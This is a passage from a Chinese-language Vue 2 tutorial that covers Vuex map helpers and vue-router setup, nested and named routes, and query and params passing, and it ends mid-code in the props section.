            // 借助 mapMutations 生成函数，从 mutations 中调用函数
            ...mapMutations("countOptions", ["JIA", "JIAN"]),
            // 借助 mapActions 生成函数，从 actions 中调用函数
            ...mapActions("countOptions", ["jiaOdd", "jiaWait"])
        },
        computed: {
            // 借助 mapState 生成计算属性，从 state 中读取数据
            ...mapState("countOptions", ["sum"]),
            // 使用不同的属性调用不同模块中的数据
            ...mapState("PersonOptions", ["personList"])
        }
    }
</script>

<style>
    button{
        margin-left: 5px;
    }
</style>
```

```vue
<template>
    <div>
        <h3>数据增大十倍后为：{{BigSUM}}</h3>
        <p>老师：{{teacher}}</p>
        <p>学生：{{student}}</p>
    </div>
</template>

<script>
    // 引入 vuex 中的四个 map 方法
    import { mapState, mapGetters } from 'vuex'

    export default {
        name: "BigSUM",
        computed: {
            // 借助 mapState 生成计算属性，从 state 中读取数据
            ...mapState("countOptions", ["teacher", "student"]),
            // 借助 mapGetters 生成计算属性，从 getters 中读取数据
            ...mapGetters("countOptions", ["BigSUM"])
        }
    }
</script>

```
```vue
<template>
    <div>
        <h1>人员列表</h1>
        <input type="text" placeholder="请输入名字" v-model="name">
        <button @click="addPerson(name)">添加</button>
        <ul>
            <li v-for="person in personList" :key="person.id">{{person.name}}</li>
        </ul>
    </div>
</template>

<script>
    // 引入 vuex 中的 map 方法
    import { mapState, mapActions } from 'vuex'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: "Person",
        data(){
            return {
                name: ''
            }
        },
        computed: {
            // 借助 mapState 生成计算属性，从 state 中读取数据
            ...mapState("PersonOptions", ["personList"])
        },
        methods: {
            // 借助 mapActions 生成函数，从 mutations 中调用函数
            ...mapActions("PersonOptions", ["addPerson"]),
        }
    }
</script>
```

# 七、路由 route

## 1、路由的理解

### ①、什么是路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），key 为路径, value 可能是 function 或 component，多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-302--QTbYKKxMUGHZMA.png)

### ②、路由分类

1. 后端路由：
   1. 理解：value 是 function，用于处理客户端提交的请求。
   2. 工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据。
2. 前端路由：
   1. 理解：value 是 component，用于展示页面内容。
   2. 工作过程：当浏览器的路径改变时，对应的组件就会显示。

### ③、vue-router 的理解

- vue 的一个插件库，专门用来实现 SPA 应用

### ④、对 SPA 应用的理解

1. 单页 Web 应用（single page web application，SPA）。
2. 整个应用只有一个完整的页面。
3. 点击页面中的导航链接不会刷新页面，只会做页面的局部更新。
4. 数据需要通过 ajax 请求获取

## 2、搭建路由环境

1. 添加依赖
   1. vue2：`npm i vue-router@3`	
   2. vue3：`npm i vue-router@4`
2. 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件；因为ES6 中 import 提升的原因，所以需要在此文件中引入 vue、vue-router、组件，以及应用 vuex 插件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/components/Home.vue'
import About from '@/components/About.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        {
            path: '/home',
            component: Home
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

3. 编辑 sce 目录下的 main.js 文件，引入 vuex

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

## 3、路由的使用

1. 实现切换（`active-class`可配置高亮样式） 

```vue
<router-link active-class="active" to="/about">About</router-link>
```

2. 指定展示位置 

```vue
<router-view></router-view>
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/components/Home.vue'
import About from '@/components/About.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        {
            path: '/home',
            component: Home
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template> 

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->
    <h2>Home 组件</h2>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

---

- 几个注意点
1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的`$router`属性获取到。

```vue
<template>
    <!-- 网页结构 -->
    <h2>Home 组件</h2>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home',
        mounted() {
            console.log('Home 组件挂载完毕了',this)
            window.aboutRoute = this.$route
            window.aboutRouter = this.$router
        },
        beforeDestroy() {
            console.log('Home 组件即将被销毁了')
        },
    }
</script>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-517--uy6-XpTzrfcZtQ.png)

## 4、多级（嵌套）路由

1.  配置路由规则，使用 `children` 配置项： 

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

2.  跳转（要写完整路径）： 

```vue
<router-link to="/home/yuehai">News</router-link>
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->
    <h2>Home 组件</h2>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下

```vue
<template>
    <h3>月海</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai"
}
</script>
```
```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-626--j-ub-2zDADsvRA.png)

## 5、命名路由

1.  作用：可以简化路由的跳转。 
2.  如何使用 
   1.  给路由命名： 

```javascript
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
          name:'hello' //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```

   2.  简化跳转： 

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

## 6、路由传参

### ①、query

1. 传递参数 

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
				
<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
	:to="{
		path:'/home/message/detail',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

2.  接收参数： 

```javascript
$route.query.id
$route.query.title
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai, children: [
                        // 三级路由，path 不要加 /
                        { path: 'detail', component: Detail }
                    ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>
            <router-view></router-view>
        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下
   - yuehai.vue 中传递参数

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 query 参数，to 的字符串写法 -->
                <!--<router-link :to="`/home/yuehai/detail?id=${msg.id}&title=${msg.title}`">{{msg.title}}</router-link>-->

                <!-- 跳转路由，并携带 query 参数，to 的对象写法 -->
                <router-link :to="{
                    path: '/home/yuehai/detail',
                    query: { id: msg.id, title: msg.title }
                }">{{msg.title}}</router-link>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    }
}
</script>
```

```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{$route.query.id}}</li>
            <li>消息标题：{{$route.query.title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail"
}
</script>

<style scoped>

</style>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-705--neDc_4DVhM2YBQ.png)

### ②、params

1.  配置路由，声明接收params参数 

```javascript
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```

2.  传递参数 

```vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
				
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

3.  接收参数： 

```javascript
$route.params.id
$route.params.title
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai, children: [
                        // 三级路由，path 不要加 /
                        // detail/:id/:title：params 路径传参，:id：占位符
                        { path: 'detail/:id/:title', name: 'detail', component: Detail }
                    ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>
            <router-view></router-view>
        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下
   - yuehai.vue 中传递参数

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 params 参数，to 的字符串写法 -->
                <!--<router-link :to="`/home/yuehai/detail/${msg.id}/${msg.title}`">{{msg.title}}</router-link>-->

                <!-- 跳转路由，并携带 params 参数，to 的对象写法；不可以写路径 path，只能写 name -->
                <router-link :to="{
                    name: 'detail',
                    params: { id: msg.id, title: msg.title }
                }">{{msg.title}}</router-link>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    }
}
</script>
```
```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{$route.params.id}}</li>
            <li>消息标题：{{$route.params.title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail"
}
</script>

<style scoped>

</style>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-863--lO3rvbLDsnH6TQ.png)

## 7、路由的 props 配置

- 作用：让路由组件更方便的收到参数

### ①、params

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai, children: [
                        /**
                         * 三级路由，path 不要加 /
                         * detail/:id/:title：params 路径传参，:id：占位符
                         *
                         * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                         * props的第二种写法，props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                         */
                        { path: 'detail/:id/:title', name: 'detail', component: Detail, props: true }
                    ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>
            <router-view></router-view>
        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下
   - yuehai.vue 中传递参数

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 params 参数，to 的字符串写法 -->
                <!--<router-link :to="`/home/yuehai/detail/${msg.id}/${msg.title}`">{{msg.title}}</router-link>-->

                <!-- 跳转路由，并携带 params 参数，to 的对象写法；不可以写路径 path，只能写 name -->
                <router-link :to="{
                    name: 'detail',
                    params: { id: msg.id, title: msg.title }
                }">{{msg.title}}</router-link>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    }
}
</script>
```
```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{id}}</li>
            <li>消息标题：{{title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail",
    props: [ 'id', 'title' ]
}
</script>

<style scoped>

</style>
```

### ②、query

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
